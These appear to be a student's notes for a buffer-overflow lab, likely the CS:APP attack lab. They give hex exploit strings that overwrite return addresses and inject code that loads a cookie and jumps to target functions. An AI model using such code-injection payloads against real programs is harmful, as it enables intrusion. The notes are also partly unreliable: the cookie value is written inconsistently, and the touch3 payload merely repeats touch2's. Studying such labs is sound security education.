
============================

# touch1

01 00 00 00 02 00 00 00 03 00 00 00 04 00 00 00 05 00 00 00 06 00 00 00 07 00 00 00 08 00 00 00 09 00 00 00 10 00 00 00 c0 17 40 00




============================

# touch2

bf fa 97 b9 59 68 ec 17 40 00 c3 90 90 00 00 00 00 00 00 00 06 00 00 00 07 00 00 00 08 00 00 00 09 00 00 00 10 00 00 00 78 dc 61 55


cookie: 0x59b997fa9

bf 01 00 00 00       	mov    $0x1,%edi

bf 59 b9 97 fa			mov    $0x59b997fa, %edi

rip: touch2的起始位置

401f10:	c7 05 c2 25 20 00 00 	movl   $0x0,0x2025c2(%rip)        # 6044dc <vlevel>

mov			$0x59b997fa9, %esi
push		addr_of_next_instruciton, $0x4017ec
ret


============================

# touch3


bf fa 97 b9 59 68 ec 17 40 00 c3 90 90 00 00 00 00 00 00 00 06 00 00 00 07 00 00 00 08 00 00 00 09 00 00 00 10 00 00 00 78 dc 61 55
